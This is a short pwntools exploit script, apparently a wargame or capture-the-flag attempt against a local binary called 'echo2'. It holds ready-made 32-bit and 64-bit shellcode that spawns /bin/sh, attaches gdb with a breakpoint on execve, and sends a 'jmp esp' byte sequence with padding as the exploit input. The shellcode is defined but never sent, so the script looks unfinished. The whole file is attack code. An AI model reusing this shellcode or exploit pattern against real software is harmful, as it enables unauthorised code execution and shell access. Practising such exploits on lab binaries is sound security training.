from pwn import *

shellcode64 = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05";
shellcode32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

context.log_level = 'debug'
context.terminal = ['st', '-e', 'sh', '-c']
r = process("echo2")

# Attach the debugger
gdb.attach(r, '''
set follow-fork-mode child
break execve
continue
''')

r.recvuntil(':')
r.sendline("\xff\xe4"+"A"*10)
